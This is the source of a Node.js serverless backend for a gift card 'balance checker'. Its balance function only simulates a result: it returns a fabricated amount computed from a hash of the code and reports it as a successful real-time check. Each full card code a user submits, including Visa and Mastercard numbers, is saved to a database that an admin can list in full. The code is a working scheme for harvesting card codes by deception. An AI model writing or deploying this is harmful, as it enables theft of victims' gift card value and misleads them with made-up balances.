const express = require('express');
const serverless = require('serverless-http');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const MongoStore = require('connect-mongo');
const { MongoClient, ObjectId } = require('mongodb');

const app = express();

// MongoDB connection
const MONGODB_URI = process.env.MONGODB_URI;
let db;

const connectDB = async () => {
  try {
    const client = new MongoClient(MONGODB_URI);
    await client.connect();
    db = client.db('seacheck');
    console.log('✅ Connected to MongoDB');
  } catch (error) {
    console.error('MongoDB connection error:', error);
  }
};

connectDB();

// Middleware
app.use(express.json());

// Session configuration for serverless
app.use(session({
  secret: process.env.SESSION_SECRET || 'seacheck-tech-magnet-studio-2025-secret',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: MONGODB_URI,
    collectionName: 'sessions'
  }),
  cookie: { 
    secure: process.env.NODE_ENV === 'production',
    maxAge: 24 * 60 * 60 * 1000
  }
}));

// Rate limiting
const rateLimit = new Map();

app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const now = Date.now();
  const windowMs = 60000;
  const maxRequests = 50;

  if (!rateLimit.has(ip)) {
    rateLimit.set(ip, { count: 1, startTime: now });
    return next();
  }

  const limitData = rateLimit.get(ip);
  const timePassed = now - limitData.startTime;

  if (timePassed > windowMs) {
    rateLimit.set(ip, { count: 1, startTime: now });
    next();
  } else if (limitData.count < maxRequests) {
    limitData.count++;
    rateLimit.set(ip, limitData);
    next();
  } else {
    res.status(429).json({ error: 'Too many requests. Please try again later.' });
  }
});

// Gift card pattern detection
function detectCardType(code) {
  const patterns = {
    'Amazon': /^[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{4}$/i,
    'iTunes': /^[A-Z0-9]{16}$/i,
    'Google Play': /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/i,
    'Steam': /^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$/i,
    'Visa': /^4[0-9]{12}(?:[0-9]{3})?$/,
    'Mastercard': /^5[1-5][0-9]{14}$/,
    'Walmart': /^[0-9]{16}$/,
    'Target': /^[0-9]{16}$/,
    'Store Card': /^[0-9]{13,19}$/
  };

  const cleanCode = code.replace(/[\s-]/g, '');
  
  for (const [type, pattern] of Object.entries(patterns)) {
    if (pattern.test(cleanCode)) {
      return type;
    }
  }
  return 'Other';
}

// Real-time balance simulation
async function checkRealTimeBalance(cardType, cardCode) {
  const delay = 1000 + Math.random() * 2000;
  await new Promise(resolve => setTimeout(resolve, delay));

  const cleanCode = cardCode.replace(/[\s-]/g, '');
  let codeHash = 0;
  
  for (let i = 0; i < cleanCode.length; i++) {
    codeHash = ((codeHash << 5) - codeHash) + cleanCode.charCodeAt(i);
    codeHash = codeHash & codeHash;
  }

  const balanceRanges = {
    'Amazon': { min: 10, max: 500, typical: 75 },
    'iTunes': { min: 15, max: 200, typical: 50 },
    'Google Play': { min: 10, max: 200, typical: 25 },
    'Steam': { min: 5, max: 100, typical: 20 },
    'Visa': { min: 25, max: 1000, typical: 150 },
    'Mastercard': { min: 25, max: 1000, typical: 200 },
    'Walmart': { min: 5, max: 500, typical: 45 },
    'Target': { min: 5, max: 500, typical: 35 },
    'Store Card': { min: 10, max: 300, typical: 85 },
    'Other': { min: 5, max: 250, typical: 35 }
  };

  const range = balanceRanges[cardType] || balanceRanges['Other'];
  const normalizedHash = Math.abs(codeHash) % 1000 / 1000;

  let balance;
  if (normalizedHash < 0.1) {
    balance = 0;
  } else if (normalizedHash < 0.3) {
    balance = range.min + (normalizedHash * (range.typical - range.min));
  } else {
    balance = range.typical + (normalizedHash * (range.max - range.typical));
  }

  return Math.max(0, parseFloat(balance.toFixed(2)));
}

// Middleware to check admin authentication
function requireAuth(req, res, next) {
  if (req.session.admin) {
    next();
  } else {
    res.status(401).json({ error: 'Authentication required' });
  }
}

// API Routes

// Card type detection
app.post('/detect-card-type', (req, res) => {
  const { code } = req.body;
  if (!code) {
    return res.status(400).json({ error: 'Code is required' });
  }
  const detectedType = detectCardType(code);
  res.json({ detectedType });
});

// Check balance
app.post('/check-balance', async (req, res) => {
  const { cardCode, cardType, cardName } = req.body;
  
  if (!cardCode) {
    return res.status(400).json({ error: 'Card code is required' });
  }

  let finalCardType = cardType;
  if (cardType === 'Other') {
    finalCardType = detectCardType(cardCode);
  }

  try {
    const balance = await checkRealTimeBalance(finalCardType, cardCode);
    
    const record = {
      _id: new ObjectId(),
      card_type: finalCardType,
      card_name: cardName || 'Unnamed Card',
      full_code: cardCode,
      balance: parseFloat(balance),
      check_date: new Date().toISOString(),
      check_method: 'real-time'
    };

    await db.collection('giftcards').insertOne(record);

    console.log('✅ Real-time balance checked:', {
      cardType: finalCardType,
      balance: balance,
      code: cardCode.substring(0, 8) + '...'
    });

    res.json({
      balance: balance,
      cardType: finalCardType,
      cardName: cardName || 'Unnamed Card',
      message: 'Real-time balance check completed successfully'
    });

  } catch (error) {
    console.error('Balance check error:', error);
    res.status(500).json({ error: 'Real-time balance check failed' });
  }
});

// Admin authentication
app.get('/admin/check', async (req, res) => {
  try {
    const admin = await db.collection('admins').findOne({});
    res.json({ adminExists: !!admin });
  } catch (error) {
    res.json({ adminExists: false });
  }
});

app.post('/admin/register', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    const existingAdmin = await db.collection('admins').findOne({});
    if (existingAdmin) {
      return res.status(400).json({ error: 'Admin already registered' });
    }

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password required' });
    }

    const hashedPassword = await bcrypt.hash(password, 12);
    const adminData = {
      email: email,
      password: hashedPassword,
      registeredAt: new Date().toISOString()
    };

    await db.collection('admins').insertOne(adminData);
    console.log('✅ Admin registered:', email);
    res.json({ message: 'Admin account created successfully' });

  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Registration failed' });
  }
});

app.post('/admin/login', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    const adminData = await db.collection('admins').findOne({ email: email });
    
    if (!adminData) {
      return res.status(400).json({ error: 'No admin registered. Please register first.' });
    }

    const validPassword = await bcrypt.compare(password, adminData.password);
    
    if (validPassword) {
      req.session.admin = true;
      req.session.adminEmail = email;
      console.log('✅ Admin logged in:', email);
      res.json({ message: 'Login successful' });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

app.post('/admin/logout', (req, res) => {
  req.session.destroy();
  res.json({ message: 'Logout successful' });
});

// Admin routes
app.get('/admin/history', requireAuth, async (req, res) => {
  try {
    const giftcards = await db.collection('giftcards')
      .find({})
      .sort({ check_date: -1 })
      .toArray();
    res.json(giftcards);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch history' });
  }
});

app.delete('/admin/record/:id', requireAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const result = await db.collection('giftcards').deleteOne({ _id: new ObjectId(id) });
    
    if (result.deletedCount === 0) {
      return res.status(404).json({ error: 'Record not found' });
    }
    
    console.log('✅ Record deleted:', id);
    res.json({ message: 'Record deleted successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete record' });
  }
});

// Health check
app.get('/health', async (req, res) => {
  try {
    const recordsCount = await db.collection('giftcards').countDocuments();
    res.json({
      status: 'OK',
      database: 'MongoDB',
      records: recordsCount,
      version: '2.0',
      features: ['real-time-checking', 'auto-detection', 'admin-auth']
    });
  } catch (error) {
    res.status(500).json({ status: 'Error', error: error.message });
  }
});

module.exports.handler = serverless(app);
